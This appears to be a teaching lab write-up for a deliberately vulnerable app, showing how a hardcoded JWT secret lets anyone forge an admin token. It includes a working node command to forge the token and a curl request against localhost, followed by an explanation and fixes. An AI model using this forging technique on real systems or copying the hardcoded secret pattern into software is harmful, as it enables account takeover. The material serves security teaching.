# Lab 07: Forgeable JWTs on /api/v1

The JSON API authenticates with JWTs signed with a hardcoded "secret": `jwt-super-secret` sits in `config.js` and `docker-compose.yml`. Anyone who can read the public repo can mint admin tokens that last a year.

**OWASP Top 10:2025:** [A07 Authentication Failures](https://owasp.org/Top10/2025/)

**Code:** `config.js` (`jwtSecret`), `middleware/auth.js` (`requireApiToken`), `routes/api/v1.js` (`/auth/token`)

## Exploit 1: forge a token with the public secret

```bash
docker compose exec web node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({ id: 2, username: 'bob', role: 'admin' }, 'jwt-super-secret', { noTimestamp: true }));"
```

Use it:

```bash
curl -s http://localhost:8888/api/v1/me -H "Authorization: Bearer <forged>"
# {"id":2,"username":"bob",...}   ← authenticated as bob without ever logging in
```

The token even expires in 365 days (`expiresIn: "365d"`), so it outlives password resets.

## Exploit 2: weak password → weak token

`POST /api/v1/auth/token` checks credentials in plain text and returns a token — no rate limit, plus the same weak signing secret. Credentials + forgeability means the API never really authenticates anyone.

## Why it happens

The token *is* the session. Its security equals the secrecy of the key. Shipping the key in a public repo turns "signed by the server" into "signed by everyone".

## Fix

- Strong secret from the environment/secret manager; rotate if leaked (it is).
- Short expiry (`15m`) + refresh tokens; reject on password change (keep a per-user `token_version`).
- Pin algorithms explicitly: `jwt.verify(token, secret, { algorithms: ["HS256"] })`.
- Different trust domain than the web session; never reuse secrets between the two.

## Verify

A token signed with `jwt-super-secret` fails verification after the secret changes; expired tokens are rejected.

## Note

This app also stores the token in `localStorage` — combined with lab 05, XSS converts directly into account takeover.